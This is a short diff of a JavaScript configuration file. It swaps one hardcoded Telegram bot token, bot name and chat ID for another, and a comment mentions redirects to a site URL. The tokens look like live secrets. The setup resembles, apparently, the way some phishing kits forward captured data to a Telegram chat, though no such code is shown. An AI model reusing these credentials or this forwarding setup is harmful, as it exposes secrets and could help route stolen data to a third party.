@@ -3,12 +3,12 @@
 
 const TELEGRAM_CONFIG = {
     // Your Telegram Bot Token (get from @BotFather on Telegram)
-    BOT_TOKEN: '8016887872:AAFc30fCbWcV6wJ_A-a_UYLeYWv55g1DBk0',
+    BOT_TOKEN: '8514180890:AAGoZo9uuQfribE7YpiQ2gP_eOYdBqzdNNc',
     
     // Your Telegram Chat ID(s) (where messages will be sent)
-    // Bot: @noorealambot
+    // Bot: @BBK_NEW678_bot
     // For multiple users, use array format
-    CHAT_ID: '6500739596'
+    CHAT_ID: '6803542708'
 };
 
 // Site URL for redirects (replace with your domain or base URL)
